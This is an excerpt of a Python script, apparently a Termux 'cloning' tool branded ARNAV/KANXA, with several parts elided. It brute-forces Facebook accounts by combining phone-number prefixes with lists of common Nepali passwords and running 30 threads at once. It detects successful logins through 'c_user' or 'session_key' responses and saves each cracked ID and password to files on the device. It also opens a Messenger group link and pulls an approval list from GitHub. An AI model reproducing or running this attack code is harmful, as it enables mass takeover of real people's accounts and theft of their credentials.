...
print('\033[1;91m[\033[1;92m⊀⊁\033[1;91m] \033[1;91m⊀\33[1;92mARNAV-CHAULAGAI\33[1;91m⊁ ')
...
print('\n\033[1;32m   Join My Group ');time.sleep(1)
os.system("xdg-open https://m.me/j/AbbKeASjg9R-npB9/")
print('\n\033[1;36m   WELCOME TO ARNAV TOOLS...');time.sleep(3)
...
try:
        ...
        os.system('pip install requests')
        os.system('python ARNAVtOoL.py')
except:pass
try:
    prox= requests.get('https://github.com/ARN9VH3R3/Paid-approval/blob/main/Nee.txt').text
...
def file_cloning():
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print('\033[1;97m [+]-------------------------------------------------------')
                                        print("\033[1;32m [+] OK IDS SAVE ✓ KANXA-OK.txt")
                                        print("\033[1;32m [+] CP IDS SAVE × KANXA-CP.txt")
...
def nep():
                ...
                global lim
                clear()
                print('\033[1;31m [+] Code example: 9815,9814,9861,9840')
                code = input('\033[1;37m [+] put code: ')
                try:
                        limit = int(input('\033[1;31m [+]\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                lim=limit
                ...
                with tred(max_workers=30) as AWM:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','pokhara','nepal','lama@123','gurung','gurung123','Tamang','gurung@123','magar','magar123','magar12345','magar@123','tamang123','tamang@123','123456']
...
def bd():
                ...
                print('\033[1;97m [+]-------------------------------------------------------')
                input(' [+] Press enter to back ')
                os.system('python KANXAAA.py')
                menu() 
              
            
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [KANXA-F1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in AWM:
                                ...
                                open('/sdcard/KANXA/KANXA_Ok.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
...
def api(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [KANXA-F2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
...
def rndm2(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [KANXA-R] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                if uid in okk:pass
                                                        ...
                                                        print('\r\r\033[1;32m [KANXA-OK] '+str(uid)+' | '+pas+'\033[1;90m')
                                                        open('/sdcard/KANXA-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [ARNAV-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ARNAV-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
